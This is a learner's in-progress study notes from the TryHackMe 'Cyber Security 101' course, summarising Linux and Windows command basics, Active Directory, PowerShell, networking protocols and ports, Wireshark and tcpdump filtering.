# Cyber Security 101 - Refresher Notes
**Start Date:** 2025-11-28
**Status:** In Progress
#### TryHackMe provides a course titled "Cyber Security 101", which seems to be an assortment of teachings related to Cyber Security as a whole. Although it seems to be showcasing the very basics of Cyber, as a way to refresh my knowledge, gauge my readiness, and most importantly, learn how to document my projects, I decided to begin with this course. The concepts that I decide to make notes on may vary depending on my whim, as it seems to be knowledge that I am familiar with, but as a refresher and practice, I hope to note most concepts, no matter how basic.      

---

## Room: Tutorial (Template/Layout Tester)
**Key Takeaways:**
* Reviewed the difference between Red Team (Offensive)
and Blue Team (Defensive).
* **CIA Triad:**
    * **Confidentiality:** Only authorized people can see data.
    * **Integrity:** Data hasn't been changed.
    * **Availability:** Data is accessible when needed.

---

## Room: [Search Skills]
* **Key Sites:** 
    * **Shodan (The "Google" For Devices):** A search engine that scans the entire internet to index devices rather than websites. it grabs "banners" to identify what hardware and software is running. If you want to see what devices are connected to the internet (especially vulnerable hardware), use Shodan.
    * **Censys (The "Google" for Infrastructure):** A search engine born from academic research that scans for internet-wide infrastructure. It focuses heavily on how devices are connected and secured. If you want to analyze how servers are configured and secured, use Censys.

---

## Room: [Linux Fundamentals Part 1] (I LOVE LINUX)
**Key Notes:**
* **Basic of Basics** -
    * **Commands** - ls (listing), cd (change directory), cat (concatenate, outputs contents of a file), pwd (print working directory), find (with * being a wildcard). grep (searches the contents of files for specific values).
    * **Shell Operators** - & (Allows you to run commands in the background of your terminal), && (Allows you to combine multiple commands together in one line of your terminal (EX: command1 && command2, command2 only runs if command1 is successful) ), > (redirector, take the output from a command (EX: echo hello > welcome.txt) and direct it elsewere), >> (same function as > operator but appends output rather than replacing)

---

## Room: [Linux Fundamentals Part 2]
**Key Notes:**
* **Flags and Switches** - Hyphen and a sort of keyword (flag) ls -a (can be viewed depending on the command with --help)
* **Commands** -  touch (creates blank file), mkdir (make directory, creates folder), rm (remove, remove a file or folder, to remove directory -R), cp (Copy a file or folder), mv (move a file or folder, can rename), file (Determine the type of a file, Important!). 
* **Permissions** - ls -lh list the permissions of all files in the directory. (Read Write Execute).
* **Directories** - /etc (commonplace location to store system files that are used by your operating system). /var (main root folder, stores data that is written by services running on the system). /root (home of the "root" system user). /tmp (volatile directory, stores data, deletes frequently).

---

## Room: [Linux Fundamentals Part 3]
**Key Notes:**
* **Text Editors** - Introduction to Nano and VIM. 'nano filename' edits a file. Searching for text, Copying and Pasting, Jumping to a line number, Finding out what line number you are on can be done with Nano. To exit, press "Crtl" and "X"
    * **VIM (Cooler version of Nano)** - Customizable, Syntax Highlighting, works on all terminials where nano may not be installed (VIM is more familiar to me).
* **Useful Utilities** - wget (allows downloads of files from the web via HTTP using address of file). SCP (transfer files between two computers using SSH). python3 -m http.server (starts HTTPServer for linux machines with Python3).
* **Processes** - ps (provides a list of the running processes, add 'aux' to see processes run by other entities). top (not one-time view, real time, refreshes ever 10 seconds). kill (kill process, SIGTERM allows it to do cleanup tasks before, SIGKILL is no cleanup, SIGSTOP suspends a process). systemctl (allows us to interact with systemd, can be used to make app start on boot [option] [service], start, stop, enable, disable). 'Ctrl + Z' can background a process. fg (command to move job to the foreground)
* **Automation** - cron (time-based job scheduler), crontab (special file recognizable by cron, requires 6 specific values, MIN (What minute), Hour (What hour), DOM (What day of the month), MON (What month of the year), DOW (What day of the week), CMD (actual command). crontab -e to edit) Supports wildcards, if no value is wish to be provided, use wildcard, Crontab Generator. exists.
* **Package Management** - software must go to apt repository to be approved. community repositories can be added by using add-apt-repository. apt (command, tool that allows management of packages/software). dpkg (installer). apt update (updates apt to recognize new entry). add-apt-repository --remove ppa:PPA_Name/ppa (removes packages, use 'apt remove[] to remove it from apt).
   
   * **Overall Notes** -  Systemd is the first process that starts, every other process that begins is a child process of systemd. Processes can run in the background and foreground. Automation comes in handy when you would like a program to run after booting. GPG (Gnu Privacy Guard), keys that are checked to see if software is the same.
    
---

## Room: [Windows Fundamentals 1] 
**Key Takeaways:**
*  NTFS (New Technology File System), known as journaling file system. Better version of FAT16/32. Standard file system for all modern Windows OS. provides security, reliability, and data integrity.
* Alternate Data Streams (ADS), a feature of the NTFS file system, known as hidden files within a file (allows a single file to contain more than one stream of data). Can be used to store metadata or extra information. Can be utilized by attackers to hide code.
* lusrmgr.msc in run is a shortcut to Local Users and Groups tab. 
* UAC (User Account Control) - "Apps and tasks always run in the security context of a non-administrator account, unless an administrator specifically authorizes administrator-level access to the system."

---

## Room: [Windows Fundamentals 2]
**Key Takeaways:**
* msconfig launches System Configuration. comgmgmt.msc opens Computer Management.
* Event Viewer has five different types of events that can be logged. [Event Viewer Info](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-types)
* Standard logs are also viewable [Standard logs Info](https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key)
* Learned about resource monitor (resmon), System Information (msinfo32)
* Retrive help manual for a command in CMD with /?
* ipconfig, netstat (shows network connections and can be used by typing netstat -a to view all active connections, including listening ports)

---

## Room: [Windows Fundamentals 3]
**Key Notes:**
* Windows firewall & network protection, Domain - The domain profile applies to networks where the host system can authenticate to a domain controller. Private - The private profile is a user-assigned profile and is used to designate private or home networks. Public - The default profile is the public profile, used to designate public networks such as Wi-Fi hotspots at airports, etc.
* Bitlocker Drive Encryption - a Windows security feauture that encrypts an entire disk drive to protect data from unauthorized access, especially if a computer is lost or stolen.
* Volume Shadow Copy Service (VSS) - a Windows technology that creates consistent point-in-time copies of files and volumes, known as "shadow copies" or "snapshots," while applications are still running. If VSS is enabled, in advanced system settings you can: Create a restore point, Perform system restore, Configure restore settings, Delete restore points.

---

## Room: [Active Directory Basics]

**Key Notes:**
* Windows Domain - a group of users and computers under the administration of a given business.

* Idea behind a domain is to centralise the administration of common components of a Windows computer network in AD (Active Directory). The server that runs AD is known as Domain Controller (DC).
* In school/university networks, you will often be provided with a username and password that you can use on any of the computers available on campus. Your credentials are valid for all machines because whenever you input them on a machine, it will forward the authentication process back to the Active Directory, where your credentials will be checked. Thanks to Active Directory, your credentials don't need to exist in each machine and are available throughout the network. Also used to restrict - (Copied from THM)
* Active Directory Domain Service (AD DS) - a Microsoft server role that acts as a centralized directory for managing and storing information about network resources like users, computers, and devices. verify credentials, define access rights for all members of a windows domain.
    * Users - one of the most common object types in Active Directory. they can be authenticated by the domain and be assigned privileges over resources like files or printers (commonly referred to as security principal). Represents two types of entities, people ( persons in an organization, ex. employee) and services (service users only have the privileges needed to run their specific service)
    * Machines - Every computer that joins the Active Directory, a machine object is created. also considered a security principal, assigned an account like any other user. Machine account names are usually followed by a dollar sign (DC01 = DC01$)
    
    * Security Groups - Define user groups to assign access rights to files or other resources to entire groups instead of single users. adding user to group, making them inherit the group's privileges. considered security principal, can have privileges over resources on the network. Groups can have both users and mechines as members, can also have other groups.
* Most Important Groups in a Domain: 
    * Domain Admins - Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including the DCs. 
    * Server Operators - Users in this group can administer Domain Controllers. They cannot change any administrative group memberships.
    * Backup Operators - Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers.
    * Account Operators - Users in this group can create or modify other accounts in the domain.
    * Domain Users - Includes all existing user accounts in the domain.
    * Domain Computers - Includes all existing computers in the domain.
    * Domain Controllers - Includes all existing DCs on the domain.
* Organizational Units (OUs) - hierarchical containers used in IT systems like Active Directory and AWS Organizations to logically group user accounts, computer accounts, and other objects.
* Default OU's - **Builtin:** Contains default groups available to any Windows host. **Computers:** Any machine joininig the network will be put here by default. You can move them if needed. **Domain Controllers:** Default OU that contains the DCs in your network. **Users:** Default users and groups that apply to a domain-wide context. **Managed Service Accounts:** Holds accounts used by services in your Windows domain.
* Security Groups are used to grant permissions over resources (allow some users to access a shared folder or network printer. Users can be a part of many groups), OUs are for applying plicies to users and computers (specific configurations that pertain to sets of users depending on their particular role. One single OU at a time, as it applies policies).
* Delegation - grants users specific privileges to perform advanced tasks on OUs without needing a Domain Administrator.
* **Task 4:** Proceeded to RDP into an account after being shown delegation to change the password of a user by utilizing powershell. Used xfreerdp on the attackbox to do so.
* Segregating devices according to their use is important. A least three categories
    * Workstations - Most common devices within an Active Directory domain. users will be logging into a workstation. should never have a privileged user signed into them.
    * Servers - Second most common, generally used to provide services to users or other servers.
    * Domain Controllers - Device which allows you to manage the Active Directory Domain. contains hashed passwords for all user accounts within the environment. 
* GPO - A collection of settings that can be applied to OUs.
* Might take 2 hours for computers to catch up with GPO change, gpupdate /force sync's GPO's immediately.
* Kerberos - the default authentication protocol of Windows.


---

#### Side Note:
*   Have been completing this year's TryHackMe AOC, might take a while to get back to note writing. (Dec 8th, 2025)


---

## Room: [Windows Command Line]
**Key Notes:**
* **Basic Commands**: 
    * **set** - Checks the path from the command line (shows the path where MS Windows will execute commands, as indicated by the line starting with Path=.). 
    * **ver** - determines the operating system (OS) version. 
    * **systeminfo** - lists info about the system such as OS info, system details, processor and memory.
    * **help** - Provies help info for a specific command
    * **cls** - Clears the CMD prompt screen.
    * Piping it through more (ex: driverquery | more) shortens the output, allowing you to see it page by page (CTRL+C to exit).
* **Network Commands**
    * **ipconfig** - allows you to check network inforamtion (using ipconfig /all for more info about your network).
    * **ping** - checks if the PC is able to get a response from a server.
    * **tracert** - checks to see what route is taken to get to the target.
    * **nslookup** - looks up a host or domain and returns it's IP address.
    * **netstat** - Displays current network connections and listening ports. (run netstat -h for more options. -a, -b, -o, -n)
* **File Commands** - 
    * **cd** - displays currect drive and directory. also sued to change directories.
    * **dir** - view child directories (dir /a - displays hidden and system files. dir /s displays files in the currect directory and subdirectories)
    * **tree** - visually represents dir and subdir
    * **mkdir** - creates directory, rmdir - removes directory
    * **type** - view text files. 
    * **copy** - allows you to copy files, move files using move command.
    * **del/erase** - delete file. (Using the wildcard character * refers to multiple files, (copy *.md C:\Markdown) will copy all files with the extension md to the directory.)
* **Process Management**
    * **tasklist** - shows list running processes (tasklst /? shows all filters.) (Ex. tasklist /FI "imagename eq sshd.exe". /FI is used to set the filter image name equals sshd.exe) 
    * **taskkill** - terminates the specified task, taskkill /PID 4567.

---

## Room: [Windows PowerShell] 

**Key Notes:**
* **Basics**
    * Object: an item with properties (characteristics) and methods (actions). Ex:  a car object might have properties like Color, Model, and FuelLevel, and methods like Drive(), HonkHorn(), and Refuel().
    * Powershell commands are known as cmdlets (more powerful than traditional windows commands, as they allow for advanced data manipulation).
    * Verb-noun naming convention (verb describes the action, noun specifies the object on which action is performed.)
        * Get-Content: Retrieves (gets) the content of a file and displays it in the console. (Shows all usable cmdlets)
        * Set-Location: Changes (sets) the current working directory.
    * It is possible to filter the list of commands based on displayed property values. (only want to display available commands of type "function", you would use Get-Command -CommandType "Function")
    * Get-Help - cmdlet that provides detailed info about other comdlets (usage, parameters, and examples)
        * Get-Alias - Lists all aliases (used by individuals who are familiar with other command-line tools) (dir is an alias for Get-ChildItem, and cd is an alias for Set-Location.)
    * cmdlets are downloadable (Find-Module -Name "PowerShell*") Cmdlet -Property "pattern*",  Install-Module is used after.
* **Navigation**
    * Get-Childitem: (similar to the dir or ls command) lists the files and directories in a location specified with the -Path parameter.
    * Set-Location: (similar to cd) changes the current directory.
    * New-Item: creates an item, specification of the path of the item and it's type (file or directory) is necessary.
    * Remove-item: removes both directories and files (akin to rmdir and del)
    * Copy-item: copy or moves files/directories
    * Get-Content: (type of cat command) read and displays content of a file.
* **Piping in PS**
    * Piping = output of one command to be used as the imput for another (Represented by | )
        * Get-ChildItem | Where-Object -Property "Extension" -eq ".txt" (Filters object based on specified condition, in this case, .txt)
    * -eq (equal to), set of comparison operators (-ne (not equal), -gt(greater than), ge(greater than or equal to), lt(less than), le(less than or equal to) )
    * Select-String: similar to grep or findstr, used for finding specific content within log files.
    * Select-Object, Where-Object, Sort-Object
* **System Info**
    * Get-ComputerInfo - system info gather (systeminfo only gets a small set of the same details)
    * Get-LocalUser lists all local user accounts.
    * Get-NetIPConfiguration & Get-NetIPAddress
* **Real Time Sys Analysis**
    * Get-Process - detailed view of all running processes.
    * Get-Service - status of services on the machine.
    * Get-NetTCPConnection displays current TCP connections,
    * Get-FileHash - useful cmdlet for generating file hashes (Get-FileHash -Path .\[Insert Destination])
* **Scripting**
    *  log analysis, detecting anomalies, and extracting indicators of compromise (IOCs) can be automated with Powershell Scripts [Blue Team].
    * system enumeration, executing remote commands, and crafting obfuscated scripts to bypass defences can be automated with Powershell scripts [Red Team]
    * System Administrators benefit, as they can automate integrity checks, managing system configs, and securnig networks.
    * Invoke-Command - used to run commands or scripts on local or remote computers and return all output to the local console.

---

## Room: [Linux Shell] 

**Key Notes:**
* To view what shell you're using: echo $SHELL
* /etc/shells shows all of the installed shells
* type the shell name that is present on your OS to use wanted shell.
* to permanently change default shell, use command - chsh -s /usr/bin/[nameofshell]
*   **Shells**
    * Bourne Again Shell (Bash): default shell for most Linux distributions. Borrowing capabilities from most shells, it is seen as the enchanced version.
    * Friendly Interactive Shell (Fish) - focuses on user-friendliness than other shells. 
    * Z Shell (Zsh) - Modern shell that combines things from other shells. 
* **Scripting**
    * Scripting can be done in various programming languages, not only shell.
    * Create a file using any text edior for the script. must be named with extension .sh (default extension for bash scripts).
    * Shebang - a special sequence of characters at the very beginning of a script that tells the system which interpreter to use to execute the file (usually #!, followed by the name of the interpreter to use while executing the script).
    * Variable - stores a value inside, you can store values in a variable and use the variable name as substitute
    * chmod +x [scriptname] gives scriipt execution permissions. (use ./ before script name to execute, to show it is in the current directory)
    * Loops - something that is repeating (send the same message to a multitude of people without having to do it one by one)
    * Conditional Statements - execute a specific code only when a condition is satisfied (if... then)
    * Make comments with #

---

#### Break:
* Break passed, beginning notes again now.

## Room: [Networking Concepts]

**Key Notes:**
* OSI model defines a framework for computer network communications.
* The OSI model is composed of seven layers: 1. Physical Layer, 2. Data Link Layer, 3. Network Layer, 4. Transport Layer, 5. Session Layer, 6. Presentation Layer 7. Application Layer
* **(People Don't Need These Stupid Packets Anyways, Learned from CCNA)**
* **Layer 1** deals with physical connections between devices, **Layer 2** deals with mac addresses, etc. **Layer 3** focueses on sending data between different networks. **Layer 4** enables end-to-end communication between running applications on different hosts. Example: TCP and UDP. **Layer 5** responsible for establishing, maintaining, and synchronising communication between  applications running on different hosts. Example: NFS and RPC. **Layer 6** Ensures data is delivered in a form the application layer can understand (handles encoding, decoding, encryption, etc). **Layer 7** provides network services directly to end-user applications. Layer 7 protocols are HTTP, FTP, DNS, POP3, SMTP, and IMAP.
* **TCP/IP**
    * The TCP/IP (Transmission Control Protocol/Internet Protocol) model only has 4 sections (Application Layer, Transport Layer, Internet Layer, Link Layer)
    * The application layer in the TCP/IP model contains layers 5, 6, and 7 of the OSI model. Internet layer is layer 3, the rest is self-explanatory.
* **IP and Subnets**
    * "One analogy of an IP address is your home postal address. Your postal address allows you to receive letters and parcels from all over the world. Furthermore, it can identify your home without ambiguity; otherwise, you cannot shop online!"
    *  An IP address comprises four octets, i.e., 32 bits. Being 8 bits, an octet allows us to represent a decimal number between 0 and 255.
    * (between 0 and 255, /24 subnet, 192.168.1.0 would be the network address while 192.168.1.255 would be the broadcast)
* **UDP&TCP**
    * The IP protocol allows us to reach a destination host on the network; the host is identified by its IP address. We need protocols that would enable processes on networked hosts to communicate with each other. There are two transport protocols to achieve that: UDP and TCP.
    * UDP is the dumbed down version of TCP, it is a simple connectionless protocol that operates at the transport layer. it does not even provide a mechanism to know that the packet has been delivered.
    * A real-life example similar to UDP is the standard mail service, with no delivery confirmation. 
    * An IP address identifies the host; we need a mechanism to determine the sending and receiving process. This can be achieved by using port numbers.
    * TCP  utilizes various mechanisms to ensure reliable data delivery.
    * As each data octet has a sequence number, it makes it easy for the receiver to identify lost or duplicated packets. 
    * A TCP connection is established by utilizing a three-way handshake, with the flags SYN (synchronise) and ACK (Acknowledgement)
    * PC to Server (SYN), Server back to PC to confirm (SYN-ACK), PC back to server (ACK).
* **Encapsulation**
    * The process of every layer adding a header/trailer to the received unit of data and sending the "encapsulated" unit to the layer below
    * It gets encapsulated, then broken down at other layers, then re-encapsulated sometimes. whether it's to save time or space.
    * Everything starts at the application layer, then heads to the physical layer, top to bottom.
    * Is reversed on the receiving end.

---
(Going to try and take a different approach with my notes, I feel like i'm writing long, rather than truly condensed, and important concepts, will be trying to focus on that going forward.)
## Room: [Networking Essentials]

**Key Notes**
* DHCP is an application-level protocol, used to automatically assign ip addresses to devices. used on internet protocol (IP) networks, uses a client-server architecture. 
* Discover, Offer, Request, Acknowledge (DORA for Short)
*  **DHCP Discover** - The client broadcasts a DHCPDISCOVER message seeking the local DHCP server if one exists.
* **DHCP Offer** - The server responds with a DHCPOFFER message with an IP address available for the client to accept.
* **DHCP Request** - The client responds with a DHCPREQUEST message to indicate that it has accepted the offered IP.
* **DHCP Acknowledge** - The server responds with a DHCPACK message to confirm that the offered IP address is now assigned to this client.
* **ARP** 
    * Address resolution protocol (ARP) is used to find the physical hardware address (MAC address) of a device when only its logical Internet Protocol (IP) address is known. 
    * Responsible for finding the MAC address related to a specific IP address. works by broadcasting an ARP query "Who has this IP address? Teach me." and gets a response back.
    * ARP request is encapsulated directly within an Ethernet frame.
    * It is considered Layer 2.
* **ICMP**
    * ICMP (Internet Control Message Protocol): utilized for network diagnostics and error reporting.
    * The two commands that rely on ICMP are: ping, tracert (traceroute).
* **Routing**
    * Speaks about how, although there are many paths that routing can take to get to one location to the other (PC to Web Server), different type of routing procedures are there to be able to do that as quickly as possible. one of them being:
    * **OSPF:** routing protocol that allows routers to share information about the network topology and calculate the most efficient paths for data transmission. It does this by having routers exchange updates about the state of their connected links and networks. This way, each router has a complete map of the network and can determine the best routes to reach any destination. (EIGRP is Cisco)
    * BGP and RIP also exist (RIP is outdated)
* **NAT**
    * One solution to address depletion is Network Address Translation (NAT).
    * The idea behind NAT lies in using one public IP address to provide Internet access to many private IP addresses. In other words, if you are connecting a company with twenty computers, you can provide Internet access to all twenty computers by using a single public IP address instead of twenty public IP addresses.
    * NAT changes the Internal network to a different external network, almost as if it was spoofing the IP, giving it a new face.
    * Network Address Translation (NAT) (specifically PAT/Overloading) allows multiple devices on a private network (192.168.1.x) to share a single public IP address (203.0.113.1) to access the internet. The router translates internal IP/port combinations to the public IP with a unique source port, mapping traffic back correctly upon return.
    * **Inside Local:** The actual private IP (192.168.1.10). **Inside Global:** The public IP representing the host (203.0.113.1). **Overloading:** Using port numbers to map multiple local addresses to one global address.

---

## Room: [Networking Core Protocols]

**Key Notes**
* **DNS**
    * Domain Name System (DNS) is responsible for mapping a domain name to an IP Address.
    * DNS operates at the Application Layer, uses UDP port 53 as default/TCP port 53 as default fallback.
    * DNS Records -
        * A record: A (Address) record maps a hostname to one or more IPv4 addresses. Ex. example.com resolves to 172.17.2.172
        * AAAA Record: similar to A Record, but for IPv6.
        * CNAME Record: (Canonical Name) record maps a domain name to another domain name. (example.com = example.org/www.example.com)
        * MX Record: (Mail Exchange) specifies mail server responsible for handling emails for a domain. (when you try to send an email to test@example.com, the mail server would query the DNS server to find the MX record.)
    * nslookup (site) - look up the ip address of a domain from the command line.
    * Whoever registers a domain name is granted the ability to set any valid DNS records.
    * Pay an annual fee, information is part of WHOIS records.
    * whois - looks up the WHOIS records of any registered domain name on Linux systems. provides name, phone number, email, and address. (Can be protected by privacy protection)
* **HTTP(S)**
    *  HTTP stands for Hypertext Transfer Protocol; the S in HTTPS stands for Secure. Relies on TCP.
    * Uses ports 80 (HTTP) and 443 (HTTPS)
* **FTP & SMTP**   
    * File Transfer Protocol, designed to transfer files.
    * TCP port 21 
    * ftp [IP] - allows you to connect to the remote FTP server.
    * **SMTP** (Simple Mail Transfer Protocol): a protocol used to send the email to an SMTP server, more specifically to a Mail Submission Agent (MSA) or a Mail Transfer Agent (MTA).
    * defines how a mail client talks with a mail server and how a mail server talks with another.
    * Similar to the process of when you go to local post office to send package.
        * **HELO or EHLO** initiates an SMTP session/**MAIL FROM** specifies the sender’s email address/**RCPT TO** specifies the recipient’s email address/**DATA** indicates that the client will begin sending the content of the email message/. is sent on a line by itself to indicate the end of the email message
* **POP3 & IMAP**
    * Designed to allow the client to communicate with a mail server and retrieve email messages. (downloads emails from the server to a local device).
    * Listens on TCP port 110
    * Commands: 
        *   **USER** <username> identifies the user
        *   **PASS** <password> provides the user’s password
        *    **STAT** requests the number of messages and total size
        *    **LIST** lists all messages and their sizes
        *    **RETR** <message_number> retrieves the specified message
        *    **DELE** <message_number> marks a message for deletion
        *    **QUIT** ends the POP3 session applying changes, such as deletions
    * **IMAP** -  a protocol for receiving email. Protocols standardize technical processes so computers and servers can connect with each other regardless of whether or not they use the same hardware or software.
    * As POP3 emails are deleted from the remote server, IMAP uses more storage as email is kept on the server and synchronized across email clients.
    * uses TCP port 143

---

## Room: [Networking Secure Prot.]

**Key Notes**
* When it comes to security, HTTP, POP3, SMTP, and IMAP become HTTPS, POP3S, SMTPS, and IMAPS, where the appended “S” stands for Secure.
* Telnet is unsecure, use SSH.
* **TLS**
    * Predecessor of TLS (Transport Layer Security) is SSL (Secure Sockets Layer), TLS grows upon, and improves SSL.
    * TLS: a cryptographic protocol operating at the OSI model’s transport layer. 
    * Allows secure communication between a client and a server over an insecure network. TLS ensures no one can read or modify the exchanged data.
    * HTTPS, DoT (DNS over TLS), MQTTS, and SIPS, the secure versions of HTTP, DNS, MQTT, and SIP, utilize SSL/TLS to become secure.
    * Steps to become a trusted authority:
        * get a signed TLS certificate (the server admin creates a CSR (Certificate Signing Request) and submits it to a CA (Certificate Authority) )
            * CA: a trusted organisation that verifies the digital identity of entities like websites, individuals, or companies by issuing digital certificates.
        * CA verifies the CSR and issues a digital cert.
        * The digital cert is used to identify the server to others, which they can confirm the validity of the signature if needed.
        * (Certs can also be self-signed, which should not be trusted.)
* **HTTPS**
    * In HTTP traffic is sent in cleartext, which allows anyone to intercept and monitor it.
    * Due to TLS, you must establish a TCP three-way handshake with the server, establish a TLS session, and communicate using the HTTP protocol to use HTTPS.
    * Adding TLS leads packets to be encrypted
* **SMTPS, POP3S, IMAPS**
    * HTTP: PORT 80 / HTTPS: PORT 443
    * SMTP: PORT 25 / SMTPS: PORT 465 and 587
    * POP3: PORT 110 / POP3S: PORT 995
    * IMAP: PORT 143 / IMAPS: PORT 993
* **SSH**
    * SSH, in comparison to telnet, offers secure authentication, confidentiality, integrity, tunneling, X11 Forwarding.
    * ssh username@hostname
    * Telnet = port 23, SSH is 22
* **SFTP&FTPS**
    * SFTP is the equivalent of SSH File Transfer.
    * Utilizing commands such as: sftp username@hostname, get filename and put filename
    * SFTP shares the port number 22 with SSH.
    * FTPS stands for File Transfer Protocol Secure. 
    * FTP uses port 21, FTPS uses port 990.
    * SFTP server setup is easy, FTPS requires a proper TLS cert to run securely.
* **VPN**
    * VPN allows companies to connect all offices and sites a main branch, so that all offices can access shared resources, as if they were at the main branch.
    * VPN allows private information exchange, so it's secure as well.

---

## Room: [Wireshark]

**Key Notes**
* **Packet Capture** - PCAP is a networking practice involving the interception of data packets travelling over a network. Once the packets are captured, they can be stored by IT teams for further analysis. The inspection of these packets allows IT teams to identify issues and solve network problems affecting daily operations.
* Wireshark utilizes PCAP, and is capable of investigating live traffic and capturing packets.
    * **Wireshark Uses**
        * Detecting and troubleshooting network problems, such as network load failure points and congestion.
        * Detecting security anomalies, such as rogue hosts, abnormal port usage, and suspicious traffic
        * Investigating and learning protocol details, such as response codes and payload data.
* Wireshark only allows discovery and investigation of packets in depth, it does not have the ability to modify any of the info.
    * **Wireshark GUI** 
        * Toolbar - contains menus and shortcuts for packet sniffing, processing. includs filtering, sorting, summarising, exporting and merging. Located on the top in the GUI (File, Edit, Etc)
        * Display Filter Bar - main query and filtering section
        * Recent Files - Self-Explanatory
        * Capture Filter and Interfaces - Capture filters and available sniffing points (network interfaces).  The network interface is the connection point between a computer and a network. The software connection (e.g., lo, eth0 and ens33) enables networking hardware.  
        * Status Bar - located at the bottom, shows numeric packet info, profile and tool status.
    * **Packet GUI**
        * Packet List Pane - Summary of each packet (source and destination addresses, protocol, and packet info). 
        * Packet Details Panel - Detailed breakdown of the packet
        * Packet Bytes Pane - Hex and decoded ASCII representation of the selected packet.
* Within wireshark, you can color packets as I way to showcase uniqueness within each packet.
* Blue shark fin button starts network sniffing.
* File, Merge allows you to merge two pcap files.
* **Packet Dissection**
    * Protocol dissection (Packet Dis.) investigates packet details by decoding available protocols and fields.
    * Packets consist of 5 to 7 layers based on the OSI model
    * frame/packet,source [MAC],source [IP],protocol,protocol errors, application protocol, and application data
* **Packet Navigation**
    * Utilize the "GO" section to specifically go to any number packet of your choosing.
    * You can use the "Edit --> Find Packet" menu to make a search inside the packets for a particular event of interest.
    * Two points in finding packets, knowing input type, and choosing the search field.
    * Mark packets by right clicking, or using edit menu.
    * You can make packet comments.
    * Exporting packets is also possible, by highlighting all the packets you want to export.
    * Wireshark also detects specific states of protocols to help analysts easily spot possible anomalies and problems (false positives/negatives are possible).
    * You can use the "lower left bottom section" in the status bar or "Analyse --> Expert Information" menu to view all available information entries via a dialogue box. It will show the packet number, summary, group protocol and total occurrence.
* **Filtering**
    * two types of filtering approaches: capture and display filters. Capture filters are used for "capturing" only the packets valid for the used filter. Display filters are used for "viewing" the packets valid for the used filter.

---

## Room: [Tcpdump: The Basics]

**Key Notes** 
* **Tcpdump:** a powerful, command-line packet analyzer used to capture, filter, and analyze network traffic (TCP, UDP, ICMP) on Linux, macOS, and Unix-like systems. Essential for GUI-less environments.
* **Basic Packet Capture**
    * all has "tcpdump" in front.
    * **(-i INTERFACE):** Decide which network int to listen to. choose to listen to all using -i any, specify with -i (eth0)
    * ip address show (or ip a s) lists the available network interfaces.
    * **(-w FILE):** saves the captured packets. can be inspected using Wireshark, etc, later.
    * **(-r FILE):** read packets from a file. useful for learning about protocol behaviour.
    * **(-c COUNT):** specifies the number of packets to capture.
    * Tcpdump will resolve IP addresses and print friendly domain names where possible. To avoid making such DNS lookups, you can use the **-n** argument (Don’t resolve IP addresses).
    * if you don’t want port numbers to be resolved, such as 80 being resolved to http, you can use the **-nn** to stop both DNS and port number lookups (Don’t resolve IP addresses and don’t resolve protocol numbers). 
    * **-v:** prints more details about the packet, produces more verbose output. (man tcpdump for manual)
    * **-vv** will produce more verbose output, **-vvv** will provide more verbosity.
    * Examples
        * **tcpdump -i eth0 -c 50 -v:** captures and displays 50 packets by listening on the eth0 interface, which is a wired Ethernet, and displays them verbosely.
        * **tcpdump -i wlo1 -w data.pcap:** captures packets by listening on the wlo1 interface (the WiFi interface) and writes the packets to data.pcap. It will continue till the user interrupts the capture by pressing CTRL-C.
        * **tcpdump -i any -nn:** captures packets on all interfaces and displays them on screen without domain name or protocol resolution.
* **Filtering Expressions** 
    * **tcpdump host IP or tcpdump host HOSTNAME:** Filters packets by IP address or hostname
    * **tcpdump src host IP:** Filters packets by a specific source host
    * **tcpdump dst host IP:** Filters packets by a specific destination host
    * **tcpdump port PORT_NUMBER:** Filters packets by port number
    * **tcpdump src port PORT_NUMBER:** Filters packets by the specified source port number
    * **tcpdump dst port PORT_NUMBER:** Filters packets by the specified destination port number
    * **tcpdump PROTOCOL:** Filters packets by protocol; examples include ip, ip6, and icmp
    * Logical operators and, or, not.
        * **and:** Captures packets where both conditions are true. For example, tcpdump host 1.1.1.1 and tcp captures tcp traffic with host 1.1.1.1.
        * **or:** Captures packets when either one of the conditions is true. For instance, tcpdump udp or icmp captures UDP or ICMP traffic.
        * **not:** Captures packets when the condition is not true. For example, tcpdump not tcp captures all packets except TCP segments; we expect to find UDP, ICMP, and ARP packets among the results.
    * Examples:
        * **tcpdump -i any tcp port 22:** listens on all interfaces and captures tcp packets to or from port 22, i.e., SSH traffic.
        * **tcpdump -i wlo1 udp port 123:** listens on the WiFi network card and filters udp traffic to port 123, the Network Time Protocol (NTP).
        * **tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap:** listen on eth0, the wired Ethernet interface and filter traffic exchanged with example.com that uses tcp and port 443. In other words, this command is filtering HTTPS traffic related to example.com.
* **Advanced Filtering**
    * greater LENGTH: Filters packets that have a length greater than or equal to the specified length
    * less LENGTH: Filters packets that have a length less than or equal to the specified length
    * A binary operation works on bits, i.e., zeroes and ones. An operation takes one or two bits and returns one bit.
        * & (And) takes two bits and returns 0 unless both inputs are 1.
        * | (Or) takes two bits and returns 1 unless both inputs are 0. 
        * ! (Not) takes one bit and inverts it; an input of 1 gives 0, and an input of 0 gives 1.
    * Tcpdump  allows you to refer to the contents of any byte in the header using the following syntax **proto[expr:size]**
        * proto: refers to protocol (arp, ether, icmp, ip, ip6, tcp, and udp)
        * expr: refers to byte offset, where 0 refers to first byte.
        * size: number of bytes that interest us, which can be one, two, or four. It is optional and is one by default.
    * filtering TCP packets based on the set TCP flag.
    * tcp[tcpflags] refer to the TCP flags field.
        * tcp-syn: TCP SYN (Synchronize)
        * tcp-ack: TCP ACK (Acknowledge)
        * tcp-fin: TCP FIN (Finish)
        * tcp-rst: TCP RST (Reset)
        * tcp-push: TCP Push
    * Examples
        * **tcpdump "tcp[tcpflags] == tcp-syn":** capture TCP packets with only the SYN flag set, while other flags are unset. 
        * **tcpdump "tcp[tcpflags] & tcp-syn != 0":**  capture TCP packets with at least the SYN (Synchronize) flag set.
        * **tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0":** capture TCP packets with at least the SYN (Synchronize) or ACK (Acknowledge) flags set.
* **Displaying Packets**
    * **tcpdump -q:** Quick and quite: brief packet information
    * **tcpdump -e:** Include MAC addresses
    * **tcpdump -A:** Print packets as ASCII encoding
    * **tcpdump -xx:** Display packets in hexadecimal format
    * **tcpdump -X:** Show packets in both hexadecimal and ASCII formats

---

## Room: [Nmap: Basic]

**Key Notes**
